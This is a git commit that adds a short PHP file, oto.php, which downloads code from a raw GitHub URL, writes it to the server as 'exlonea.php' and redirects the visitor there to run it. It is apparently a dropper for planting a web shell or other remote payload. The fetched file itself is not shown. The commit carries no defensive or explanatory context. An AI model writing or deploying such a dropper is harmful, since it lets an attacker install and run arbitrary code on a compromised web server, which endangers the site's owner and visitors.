ec2a55b92a29529a4cb898311c5e582902dcb1ca
k36t61 <k36t61@gmail.com>
2025-07-14 16:34:33 +0300

    Add files via upload

---
+++ oto.php
@@ -0,0 +1,12 @@
+<?php
+ $url = "https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/7.2.php";
+    $fileContent = file_get_contents($url);
+    if ($fileContent !== false) {
+        $fileName = "exlonea.php";
+        $uploadDirectory = "";
+        if (file_put_contents($uploadDirectory . $fileName, $fileContent) !== false) {
+            header("Location: " . $fileName);
+            exit;
+        } 
+    }
+?>
